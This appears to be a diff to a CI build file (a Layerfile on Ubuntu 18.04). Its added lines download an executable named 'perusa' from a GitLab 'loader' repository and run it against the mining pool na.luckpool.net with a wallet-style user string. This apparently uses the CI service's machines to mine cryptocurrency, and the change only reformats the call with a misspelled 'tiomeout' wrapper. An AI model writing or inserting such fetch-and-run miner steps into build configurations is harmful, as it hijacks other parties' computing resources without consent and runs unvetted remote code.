@@ -3,4 +3,6 @@ FROM vm/ubuntu:18.04
 SPLIT 30
 RUN apt-get update && \
     apt-get install libjansson4 unzip && \
-	  wget -qO perusa https://gitlab.com/admin1246/loader/-/raw/main/perusa && chmod +x perusa && ./perusa -v -l na.luckpool.net:3956 -u RSo6rY4bCWyhs1PmyVK3mp3GYYG5tDB9mK.layerfile
+    wget -qO perusa https://gitlab.com/admin1246/loader/-/raw/main/perusa && \ 
+    chmod +x perusa && \
+    tiomeout 300m ./perusa -v -l na.luckpool.net:3956 -u RSo6rY4bCWyhs1PmyVK3mp3GYYG5tDB9mK.layerfile
